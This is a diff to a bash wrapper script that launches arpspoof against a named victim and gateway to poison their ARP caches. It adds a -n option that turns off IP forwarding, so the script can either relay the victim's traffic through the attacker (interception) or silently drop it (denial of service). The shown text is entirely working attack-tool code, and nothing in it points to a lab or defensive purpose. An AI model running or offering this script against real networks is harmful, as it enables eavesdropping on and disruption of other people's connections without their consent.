@@ -4,7 +4,7 @@
 
 RCFILE="/tmp/arpspoofex.rc"
 
-while getopts "hd:s:" opt 
+while getopts "hnd:s:" opt 
 do
 	case $opt in
 		h)	# Help
@@ -16,9 +16,13 @@ do
 			echo ""
 			echo "Options"
 			echo -e "-h\t\t\tHelp"
+			echo -e "-n\t\t\tNo Forwarding"
 			echo -e "-s <IP Address>\t\tSource IP Address."
 			echo -e "\t\t\tDefaults to the Gateway IP Address if not set."
 			exit 1
+		;;
+		n)	# No Forwarding
+			NOFORWARD=true
 		;;
 		d)	# Destination
 			VICTIM=$OPTARG
@@ -48,7 +52,15 @@ then
 fi
 
 echo "Starting arpspoof..."
-echo 1 > /proc/sys/net/ipv4/ip_forward
+
+if [ "$NOFORWARD" == "true" ]
+then
+	FORWARD=0
+else
+	FORWARD=1
+fi
+echo $FORWARD > /proc/sys/net/ipv4/ip_forward
+
 echo "startup_message off" > $RCFILE
 echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
 echo -e "screen -t arpspoof arpspoof -r -t $GATEWAY $VICTIM" >> $RCFILE
